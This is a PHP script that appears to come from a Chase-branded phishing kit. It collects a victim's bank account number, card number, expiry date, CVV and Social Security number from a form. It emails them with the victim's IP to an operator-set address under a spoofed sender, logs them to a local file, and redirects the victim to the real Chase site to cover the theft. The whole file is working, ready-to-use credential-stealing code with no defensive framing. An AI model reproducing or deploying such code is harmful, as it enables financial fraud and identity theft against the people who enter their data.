<?php

include '../your_email_bro_here/your_email.php';


$ip = $_SERVER['REMOTE_ADDR'];
$anmbr = $_POST['anmbr'];
$cn = $_POST['cn'];
$de_year = $_POST['de-year'];
$de_month = $_POST['de-month'];
$v = $_POST['v'];
$ssn = $_POST['ssn'];

$mssg = '
<body>
<h1 style="font-size:18px;font-family:Arial,sans-serif;text-align:center;"> ||| rezult Chase cc info </span> From : <span style="font-weight:bold;color:#3396FF;">'.$ip.' </span>|||</h1>
<p style="font-size:15px;text-align:center;"> || account number : <span style="font-weight:bold;color:#FF5733;">'.$anmbr.'</span> ||</span></p>
<p style="font-size:15px;text-align:center;"> || card number : <span style="font-weight:bold;color:#FF5733;">'.$cn.'</span> ||</span></p>
<p style="font-size:15px;text-align:center;"> || date d"épiration : <span style="font-weight:bold;color:#FF5733;">'.$de_month.'/'.$de_year.'</span> ||</span></p>
<p style="font-size:15px;text-align:center;"> || ccv : <span style="font-weight:bold;color:#FF5733;">'.$v.'</span> ||</span></p>
<p style="font-size:15px;text-align:center;padding:0 10px 15px 10px;border-bottom:2px solid black;"> || social sécurity Number : <span style="font-weight:bold;color:#FF5733;">'.$ssn.'</span> ||</span></p></body>';

$to = $your_email;
$subject = "from : ".$ip;
$from = '|| chase Rezult || <chase@rezult.com>';
 
$headers  = 'MIME-Version: 1.0' . "\r\n";
$headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
 
$headers .= 'From: '.$from."\r\n".
    'Reply-To: '.$from."\r\n" .
    'X-Mailer: PHP/' . phpversion();

mail($to, $subject, $mssg, $headers);
$my_file = 'rezult.html';
$handle = fopen($my_file, 'a');
fwrite($handle, $mssg);
fclose($handle);
header('Location: https://www.chase.com/');

?>